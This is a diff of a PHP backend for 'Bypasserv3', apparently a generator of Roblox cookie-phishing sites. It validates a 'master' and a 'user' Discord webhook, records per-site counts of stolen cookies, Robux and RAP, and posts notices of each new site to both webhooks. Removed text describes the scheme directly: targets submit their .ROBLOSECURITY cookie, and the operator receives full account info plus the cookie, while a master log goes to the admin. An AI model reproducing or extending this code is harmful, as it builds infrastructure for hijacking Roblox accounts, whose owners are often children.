@@ -1,7 +1,7 @@
 <?php
 /**
- * Bypasserv3 - Instance Creator
- * NO DASHBOARD - Direct webhook notifications only
+ * Bypasserv3 - Dualhook Instance Creator
+ * Updated with dual webhook support
  */
 
 header('Content-Type: application/json');
@@ -38,9 +38,8 @@ if (json_last_error() !== JSON_ERROR_NONE) {
 }
 
 $directory = sanitizeDirectory($input['directory'] ?? '');
-$webhook = trim($input['webhook'] ?? '');
-$username = 'Bypasserv3';
-$profilePicture = 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png';
+$masterWebhook = trim($input['masterWebhook'] ?? MASTER_WEBHOOK);
+$userWebhook = trim($input['userWebhook'] ?? '');
 
 // ============================================
 // VALIDATION
@@ -71,16 +70,29 @@ if (directoryExists($directory)) {
     exit;
 }
 
-// Webhook validation
-if (empty($webhook)) {
+// Master Webhook validation
+if (empty($masterWebhook)) {
     http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Webhook URL is required']);
+    echo json_encode(['success' => false, 'error' => 'Master webhook URL is required']);
     exit;
 }
 
-if (!validateWebhook($webhook)) {
+if (!validateWebhook($masterWebhook)) {
     http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL. Please check your Discord webhook.']);
+    echo json_encode(['success' => false, 'error' => 'Invalid master webhook URL. Please check your Discord webhook.']);
+    exit;
+}
+
+// User Webhook validation
+if (empty($userWebhook)) {
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'User webhook URL is required']);
+    exit;
+}
+
+if (!validateWebhook($userWebhook)) {
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'Invalid user webhook URL. Please check your Discord webhook.']);
     exit;
 }
 
@@ -95,155 +107,79 @@ if (!checkRateLimit($clientIP, 10, 3600)) {
 }
 
 // ============================================
-// CREATE INSTANCE DATA (NO TOKEN NEEDED)
+// CREATE INSTANCE DATA WITH DUALHOOKS
 // ============================================
 $instanceData = [
     'directory' => $directory,
-    'webhook' => MASTER_WEBHOOK,
-    'userWebhook' => $webhook,
-    'username' => $username,
-    'profilePicture' => $profilePicture,
+    'masterWebhook' => $masterWebhook,
+    'userWebhook' => $userWebhook,
     'createdAt' => date('c'),
     'createdIP' => $clientIP,
     'stats' => [
-        'totalVisits' => 0,
         'totalCookies' => 0,
         'totalRobux' => 0,
         'totalRAP' => 0,
+        'totalVisits' => 0,
         'totalSummary' => 0
     ],
     'dailyStats' => [
-        'visits' => array_fill(0, 7, 0),
         'cookies' => array_fill(0, 7, 0),
         'robux' => array_fill(0, 7, 0),
         'rap' => array_fill(0, 7, 0),
+        'visits' => array_fill(0, 7, 0),
         'summary' => array_fill(0, 7, 0)
     ]
 ];
 
-// ============================================
-// SAVE INSTANCE
-// ============================================
-if (!saveInstance($directory, $instanceData)) {
-    http_response_code(500);
-    echo json_encode(['success' => false, 'error' => 'Failed to create instance directory']);
-    exit;
-}
+// Save instance data
+saveInstanceData($directory, $instanceData);
 
 // ============================================
-// UPDATE GLOBAL STATS
+// SEND MASTER WEBHOOK NOTIFICATION
 // ============================================
-updateGlobalStats('totalInstances', 1);
-
-// ============================================
-// LOG CREATION
-// ============================================
-logSecurityEvent('instance_created', [
-    'directory' => $directory,
-    'ip' => $clientIP
-]);
-
-// ============================================
-// BUILD URLS
-// ============================================
-$domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
-$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-$baseUrl = $protocol . '://' . $domain;
-$instanceUrl = $baseUrl . '/public/?dir=' . $directory;
-
-// ============================================
-// SEND MASTER ADMIN BOT NOTIFICATION
-// ============================================
-if (!empty(MASTER_WEBHOOK)) {
-    $masterWebhookData = [
-        'username' => 'Master Admin Bot',
-        'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
-        'embeds' => [
-            [
-                'title' => '🆕 New Site Generated',
-                'description' => "**Instance:** `{$directory}`",
-                'color' => hexdec('5865F2'),
-                'fields' => [
-                    [
-                        'name' => '🔗 Link',
-                        'value' => "{$instanceUrl}\n({$instanceUrl})",
-                        'inline' => false
-                    ],
-                    [
-                        'name' => '🌐 IP',
-                        'value' => "`{$clientIP}`",
-                        'inline' => false
-                    ],
-                    [
-                        'name' => '👤 User Webhook',
-                        'value' => "{$webhook}",
-                        'inline' => false
-                    ]
-                ],
-                'footer' => [
-                    'text' => 'Today at ' . date('g:i A')
-                ]
-            ]
-        ]
-    ];
-    
-    sendWebhook(MASTER_WEBHOOK, $masterWebhookData);
-}
+$masterPayload = [
+    'embeds' => [[
+        'title' => '✅ New Site Generated',
+        'description' => "**Site Name:** `{$directory}`\n**Public URL:** `https://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/public/?dir={$directory}`\n**Master Webhook:** Connected\n**User Webhook:** Connected",
+        'color' => 3066993,
+        'fields' => [
+            ['name' => 'Status', 'value' => '🟢 Active', 'inline' => true],
+            ['name' => 'Created', 'value' => date('Y-m-d H:i:s'), 'inline' => true],
+            ['name' => 'IP', 'value' => $clientIP, 'inline' => true]
+        ],
+        'footer' => ['text' => 'Bypasserv3 Dualhook Generator'],
+        'timestamp' => date('c')
+    ]]
+];
+sendWebhookNotification($masterWebhook, $masterPayload);
 
 // ============================================
 // SEND USER WEBHOOK NOTIFICATION
 // ============================================
-$webhookData = [
-    'username' => 'Bypasserv3',
-    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
-    'embeds' => [
-        [
-            'title' => 'Site Generated Successfully!',
-            'description' => "Your bypass site **{$directory}** is ready to collect cookies!",
-            'color' => hexdec('22c55e'),
-            'fields' => [
-                [
-                    'name' => '📁 Site Name',
-                    'value' => "```{$directory}```",
-                    'inline' => false
-                ],
-                [
-                    'name' => '🔗 Your Link',
-                    'value' => "```{$instanceUrl}```\n[Click to Open]({$instanceUrl})",
-                    'inline' => false
-                ],
-                [
-                    'name' => '✅ Features Included',
-                    'value' => "✅ Account info fetching\n✅ Robux balance display\n✅ Premium status check\n✅ Limited RAP calculation\n✅ Group ownership detection\n✅ Game visit stats\n✅ Rich Discord embeds\n✅ Cookie refresh bypass\n✅ Master admin logging",
-                    'inline' => false
-                ],
-                [
-                    'name' => '📋 How It Works',
-                    'value' => "1️⃣ Share your link with targets\n2️⃣ They submit their `.ROBLOSECURITY` cookie\n3️⃣ Cookie is automatically **Bypassed**\n4️⃣ You receive **FULL ACCOUNT INFO + BYPASSED COOKIE** via webhook\n5️⃣ Master log sent to admin",
-                    'inline' => false
-                ]
-            ],
-            'footer' => [
-                'text' => 'Bypasserv3 Generator • ' . date('M d, Y')
-            ],
-            'timestamp' => date('c'),
-            'thumbnail' => [
-                'url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png'
-            ]
-        ]
-    ]
+$userPayload = [
+    'embeds' => [[
+        'title' => '🎉 Your Bypasser Site is Ready!',
+        'description' => "Your Roblox bypasser site has been created successfully!\n\n**Site:** `{$directory}`\n**Link:** `https://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/public/?dir={$directory}`",
+        'color' => 3447003,
+        'fields' => [
+            ['name' => '✨ Features', 'value' => '• Account Info Fetching\n• Robux Balance Display\n• RAP Value Tracking\n• Full Account Statistics', 'inline' => false]
+        ],
+        'footer' => ['text' => 'Bypasserv3'],
+        'timestamp' => date('c')
+    ]]
 ];
+sendWebhookNotification($userWebhook, $userPayload);
 
-sendWebhook($webhook, $webhookData);
+// Update global stats
+updateGlobalStats('totalInstances', 1);
 
 // ============================================
-// RETURN SUCCESS RESPONSE (NO DASHBOARD)
+// RETURN SUCCESS RESPONSE
 // ============================================
-http_response_code(201);
 echo json_encode([
     'success' => true,
     'directory' => $directory,
-    'instanceUrl' => $instanceUrl,
-    'message' => 'Instance created successfully! All logs will be sent to your webhook.'
+    'publicUrl' => 'https://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/public/?dir=' . $directory,
+    'message' => 'Site generated successfully with DUALHOOK NOTIFICATIONS!'
 ]);
 ?>
